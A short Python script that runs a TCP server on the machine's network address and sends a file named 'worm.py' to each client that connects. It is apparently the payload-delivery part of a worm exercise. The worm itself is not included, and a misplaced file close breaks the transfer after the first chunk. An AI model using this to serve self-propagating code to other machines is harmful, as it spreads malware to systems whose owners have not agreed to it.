#!/usr/bin/env python3
import socket 
import netifaces
import sys


if __name__ == '__main__':
    HOST = "127.0.0.1" # initailize
    interfaces = netifaces.interfaces()
    for interface_name in interfaces:
        addresses = netifaces.ifaddresses(interface_name)
        for item in addresses[netifaces.AF_INET]:
            if 'addr' in item:
                if item['addr'] != "127.0.0.1":
                    HOST = item['addr']
                    print(HOST)
    PORT = int(sys.argv[1])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(2)
    print('server start at: %s:%s' % (HOST, PORT))
    print('wait for connection...')

    while True:
        try:
            conn, addr = s.accept()
        
            print('connected by ' + str(addr))
            filename = "worm.py"
            f = open(filename,'rb')
            outdata = f.read(1024)
            while (outdata):
                conn.send(outdata)
                #print('Sent ',repr(outdata))
                print("sent over")


                outdata = f.read(1024)
                f.close() #???????

            conn.close()
        except KeyboardInterrupt: #### the problem of address already in use
            print("=====")
            f.close()
            conn.close()
            sys.exit(0)

    


        

